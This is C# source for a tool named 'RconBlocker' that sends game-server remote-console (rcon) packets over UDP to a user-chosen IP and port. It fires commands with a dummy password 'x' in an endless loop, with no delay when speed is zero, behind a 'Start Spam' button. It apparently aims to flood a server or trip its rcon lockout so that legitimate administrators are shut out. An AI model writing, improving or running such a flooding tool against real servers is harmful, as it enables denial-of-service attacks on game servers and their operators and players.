using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;

namespace RconBlocker
{
    class SendRcon
    {
        frm_main frm;
        bool spamming = false;
        string rconCommand;
        string gameServerIP;
        int gameServerPort;
        int sleep;
        //public void spamRcon(frm_main main,string rconCommand, string gameServerIP, string password, int gameServerPort)
        public void SendThis(frm_main main, string Command, string ServerIP, int ServerPort,int speed)
        {
            rconCommand = Command;
            gameServerIP = ServerIP;
            gameServerPort = ServerPort;
            sleep = speed;
            frm = main;
        }
        public void StopSpam()
        {
            spamming = false;
        }
        public void spamRcon()
        {
            int x = 0;
            spamming = true;
            if(sleep == 0)
            {
                while (spamming)
                {
                    try
                    {
                        sendCommand(rconCommand, gameServerIP, "x", gameServerPort);
                        //sendCommand(frm.txt_command.Text, frm.txt_ip.Text, "x", int.Parse(frm.txt_port.Text));
                        x++;
                        frm.SetCounterValue(x);
                    }
                    catch (Exception e)
                    {
                        spamming = false;
                        frm.SetbtnAction("Start Spam");
                        frm.ShowMessage("There was a Problem with Your Request", "Error");
                        //frm.ShowMessage(e.ToString(),"Error");
                    }
                }
            }
            else
            {
                while (spamming)
                {
                    try
                    {
                        sendCommand(rconCommand, gameServerIP, "x", gameServerPort);
                        //sendCommand(frm.txt_command.Text, frm.txt_ip.Text, "x", int.Parse(frm.txt_port.Text));
                        x++;
                        frm.SetCounterValue(x);
                        Thread.Sleep(sleep);
                    }
                    catch (Exception e)
                    {
                        spamming = false;
                        frm.SetbtnAction("Start Spam");
                        frm.ShowMessage("There was a Problem with Your Request", "Error");
                        //frm.ShowMessage(e.ToString(),"Error");
                    }
                }
            }

        }
        
        public byte[] prepareCommand(string command)
        {
            byte[] bufferTemp = Encoding.ASCII.GetBytes(command);
            byte[] bufferSend = new byte[bufferTemp.Length + 5];

            //intial 5 characters as per standard
            bufferSend[0] = byte.Parse("255");
            bufferSend[1] = byte.Parse("255");
            bufferSend[2] = byte.Parse("255");
            bufferSend[3] = byte.Parse("255");
            bufferSend[4] = byte.Parse("2");

            //copying bytes from challenge rcon to send buffer
            int j = 5;

            for (int i = 0; i < bufferTemp.Length; i++)
            {
                bufferSend[j++] = bufferTemp[i];
            }
            return bufferSend;
        }
        /*
        public string sendRCON(string serverIp, int serverPort, string rconPassword, string rconCommand)
        {

            UdpClient client = new UdpClient();
            client.Connect(serverIp, serverPort);


            //send challenge command and get response
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

            //retrive number from challenge response 
            //string challenge_rcon = Encoding.ASCII.GetString(bufferRec);
            //challenge_rcon = string.Join(null, Regex.Split(challenge_rcon, "[^\\d]"));

            //preparing rcon command to send
            string command = "rcon " + " " + rconPassword + " " + rconCommand;
            byte[] bufferSend = this.prepareCommand(command);

            client.Send(bufferSend, bufferSend.Length);
            byte[] bufferRec = client.Receive(ref RemoteIpEndPoint);
            return Encoding.ASCII.GetString(bufferRec);
        }
        */
        public void checkRCON()
        {
            try
            {
                UdpClient client = new UdpClient();
                client.Connect(gameServerIP, gameServerPort);

                //send challenge command and get response
                IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

                //retrive number from challenge response 
                //string challenge_rcon = Encoding.ASCII.GetString(bufferRec);
                //challenge_rcon = string.Join(null, Regex.Split(challenge_rcon, "[^\\d]"));

                //preparing rcon command to send
                string command = "rcon " + " x " + rconCommand;
                byte[] bufferSend = this.prepareCommand(command);
                client.Send(bufferSend, bufferSend.Length);
                byte[] bufferRec = client.Receive(ref RemoteIpEndPoint);
                //return Encoding.ASCII.GetString(bufferRec);
                frm.ShowMessage("Server Responsed & its Exsits :) !", "Rcon Blocker");
            }
            catch (Exception)
            {
                frm.ShowMessage("No Response from Server :( maybe Ip or Port is wrong? or Check Your Network Connection.", "Rcon Blocker");
                //throw;
            }
        }

        public void sendCommand(string rconCommand, string gameServerIP,string password, int gameServerPort)
        {
            Socket client = new Socket(AddressFamily.InterNetwork,
                                       SocketType.Dgram,
                                       ProtocolType.Udp);
            client.Connect(IPAddress.Parse(gameServerIP), gameServerPort);

            string command;
            //command = "cron " + password + " " + rconCommand;
            command = "rcon " + password + " " + rconCommand;
            byte[] bufferTemp = Encoding.ASCII.GetBytes(command);
            byte[] bufferSend = new byte[bufferTemp.Length + 4];

            bufferSend[0] = byte.Parse("255");
            bufferSend[1] = byte.Parse("255");
            bufferSend[2] = byte.Parse("255");
            bufferSend[3] = byte.Parse("255");
            int j = 4;

            for (int i = 0; i < bufferTemp.Length; i++)
            {
                bufferSend[j++] = bufferTemp[i];
            }

            IPEndPoint RemoteIpEndPoint
                = new IPEndPoint(IPAddress.Parse(gameServerIP), 0);
            client.Send(bufferSend, SocketFlags.None);
            byte[] bufferRec = new byte[64999];
        }
    }
}
